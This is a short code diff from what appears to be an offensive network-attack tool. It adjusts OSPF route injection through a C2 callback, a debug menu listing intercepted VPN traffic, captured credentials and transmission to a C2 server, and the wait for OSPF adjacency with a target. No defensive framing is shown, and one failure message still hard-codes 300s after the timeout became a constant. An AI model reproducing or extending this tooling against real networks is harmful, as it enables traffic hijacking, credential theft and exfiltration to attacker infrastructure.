@@ -389,7 +389,7 @@ def _make_remote_cb(c2_config: dict, agent_state: dict):
                           f"Cannot parse prefix {spec!r}. "
                           "Use CIDR (10.0.0.0/24) or addr/mask.")
                     return
-                ospf_adjacency.add_router_stub_route(ctx, prefix, mask)
+                ospf_adjacency.add_router_stub_route(ctx, prefix, mask, metric=1)
                 _send("INJECT-OK", f"Injected OSPF stub: {prefix}/{mask}")
 
         # ── Active DHCP leases ────────────────────────────────────────────────
@@ -448,7 +448,6 @@ def debug_menu(networks: list, proposed_leases: dict, server_details: dict,
       6  Intercepted VPN traffic (files) and captured credentials
       7  Transmit to C2 (--remote only)
     """
-    time.sleep(2)  # let startup output settle
     while True:
         sep = "─" * 52
         print(f"\n{sep}")
@@ -615,8 +614,8 @@ def setup_and_form_adjacency(interface, ospf_params, target_ip=None, vpn_subnets
         name="ospf-engine",
     ).start()
 
-    print_step("START", f"Waiting up to 300s for OSPF FULL adjacency on {interface}...")
-    if not context["adjacency_ready_event"].wait(timeout=300):
+    print_step("START", f"Waiting up to {ospf_adjacency.OSPF_FULL_WAIT_TIMEOUT}s for OSPF FULL adjacency on {interface}...")
+    if not context["adjacency_ready_event"].wait(timeout=ospf_adjacency.OSPF_FULL_WAIT_TIMEOUT):
         print_step("FAIL", "OSPF FULL adjacency not reached within 300s")
         raise TimeoutError(f"OSPF adjacency timeout on {interface}")
     print_step("OK", "OSPF FULL adjacency reached")
